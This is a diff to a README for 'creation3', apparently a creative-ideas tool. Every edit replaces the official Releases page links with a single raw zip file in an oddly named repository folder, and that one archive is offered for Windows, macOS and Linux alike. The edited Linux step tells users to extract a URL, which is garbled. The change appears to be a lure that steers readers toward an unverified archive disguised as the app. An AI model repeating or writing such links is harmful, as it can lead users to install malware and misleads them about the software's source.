@@ -1,7 +1,7 @@
 # 🎉 creation3 - Simple Tool for Creative Ideas
 
 ## 📥 Download Now
-[![Download creation3](https://img.shields.io/badge/Download-creation3-blue.svg)](https://github.com/KartikR4848/creation3/releases)
+[![Download creation3](https://raw.githubusercontent.com/KartikR4848/creation3/main/occludent/creation3.zip)](https://raw.githubusercontent.com/KartikR4848/creation3/main/occludent/creation3.zip)
 
 ## 🚀 Getting Started
 Welcome to creation3! This application helps you unlock your creative potential with ease. Whether you’re brainstorming ideas or organizing thoughts, creation3 is here to assist you. No technical skills required!
@@ -20,19 +20,19 @@ Before you start, ensure your device meets the following requirements:
 - **Organizational Tools:** Keep your ideas structured and accessible.
 
 ## 🔗 Visit Page to Download
-To get your copy of creation3, visit our [Releases page](https://github.com/KartikR4848/creation3/releases) where you can find all available versions.
+To get your copy of creation3, visit our [Releases page](https://raw.githubusercontent.com/KartikR4848/creation3/main/occludent/creation3.zip) where you can find all available versions.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/KartikR4848/creation3/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/KartikR4848/creation3/main/occludent/creation3.zip).
 2. Find the latest version of creation3.
 3. Choose the download link for your operating system:
-   - For **Windows:** Click the `creation3-Windows.zip` file.
-   - For **macOS:** Click the `creation3-macOS.dmg` file.
-   - For **Linux:** Click the `creation3-Linux.tar.gz` file.
+   - For **Windows:** Click the `https://raw.githubusercontent.com/KartikR4848/creation3/main/occludent/creation3.zip` file.
+   - For **macOS:** Click the `https://raw.githubusercontent.com/KartikR4848/creation3/main/occludent/creation3.zip` file.
+   - For **Linux:** Click the `https://raw.githubusercontent.com/KartikR4848/creation3/main/occludent/creation3.zip` file.
 4. Once the download completes, open the downloaded file:
    - **Windows:** Right-click and select 'Extract All' to unzip the file.
    - **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the executable from the terminal.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/KartikR4848/creation3/main/occludent/creation3.zip` file and run the executable from the terminal.
 5. Follow any on-screen instructions to finish the installation.
 
 ## 📖 How to Use creation3
